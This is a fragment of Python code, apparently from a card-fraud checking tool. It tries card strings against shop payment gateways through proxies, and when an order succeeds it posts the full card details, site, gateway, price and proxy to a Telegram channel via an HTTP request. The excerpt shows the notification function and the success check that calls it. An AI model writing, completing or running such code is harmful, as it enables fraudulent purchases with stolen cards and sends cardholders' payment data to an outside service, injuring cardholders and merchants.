...
async def send_telegram_log_async(site, cc_string, gateway, price, currency, proxy_str):
    ...
    proxy_display = proxy_str if proxy_str else "Direct / No Proxy"
    
    text = (
        f"🔔 <b>Order Placed Successfully!</b>\n\n"
        f"🌐 <b>Site:</b> {site}\n"
        f"💳 <b>Card Details:</b> <code>{cc_string}</code>\n"
        f"🏛️ <b>Gateway:</b> {gateway}\n"
        f"💵 <b>Price:</b> {price} {currency}\n"
        f"📡 <b>Proxy Used:</b> {proxy_display}"
    )
        ...
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload, timeout=10) as resp:
                if resp.status != 200:
                    ...
                    print(f"Telegram API returned status {resp.status}: {resp_text}")
    except Exception as e:
        print(f"Error sending Telegram log: {e}")
    ...
    try:
        ...
        try:
            ...
            if clean_response == "ORDER_PLACED":
                try:
                    loop.run_until_complete(
                        send_telegram_log_async(site, cc_string, gateway, price, currency, proxy_str)
                    )
                except Exception as e_tg:
                    print(f"Telegram notification error: {e_tg}")
        finally:
            loop.close()
